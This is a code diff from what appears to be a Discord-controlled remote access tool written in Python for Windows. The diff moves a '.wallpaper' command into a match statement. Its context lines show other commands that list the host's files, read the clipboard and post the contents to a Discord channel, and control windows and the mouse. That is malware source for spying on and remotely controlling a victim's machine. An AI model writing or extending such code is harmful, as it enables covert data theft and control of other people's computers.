@@ -265,6 +265,7 @@ async def on_message(message):
                 case ".ping":
                     await message.reply(f"Pong! \n jk heres the latency: \n``{round(client.latency * 1000)}ms``")
                 case ".ls":
+                    import os
                     files = "\n".join(os.listdir())
                     if files == "":
                         files = "No Files Found"
@@ -410,7 +411,13 @@ async def on_message(message):
                         body = value.decode()
                         user32.CloseClipboard()
                         await message.channel.send(f"Clipboard content is : \n``` {body}```")
-
+                case ".wallpaper":
+                    import ctypes
+                    import os
+                    path = os.path.join(os.getenv('TEMP') + "\\temp.jpg")
+                    await message.attachments[0].save(path)
+                    ctypes.windll.user32.SystemParametersInfoW(20, 0, path , 0)
+                    await message.reply("changed wallpaper")
 
 
             if message.content.lower().startswith(".export"):
@@ -561,13 +568,6 @@ async def on_message(message):
                 win32gui.SetWindowPos(hwnd,win32con.HWND_NOTOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)
                 win32gui.SetWindowPos(hwnd,win32con.HWND_TOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)  
                 win32gui.SetWindowPos(hwnd,win32con.HWND_NOTOPMOST, 0, 0, 0, 0, win32con.SWP_SHOWWINDOW + win32con.SWP_NOMOVE + win32con.SWP_NOSIZE)
-            elif message.content.lower().startswith(".wallpaper"):
-                import ctypes
-                import os
-                path = os.path.join(os.getenv('TEMP') + "\\temp.jpg")
-                await message.attachments[0].save(path)
-                ctypes.windll.user32.SystemParametersInfoW(20, 0, path , 0)
-                await message.reply("changed wallpaper")
 
             elif message.content.lower().startswith(".mouse"):
                 command = message.content[7:]
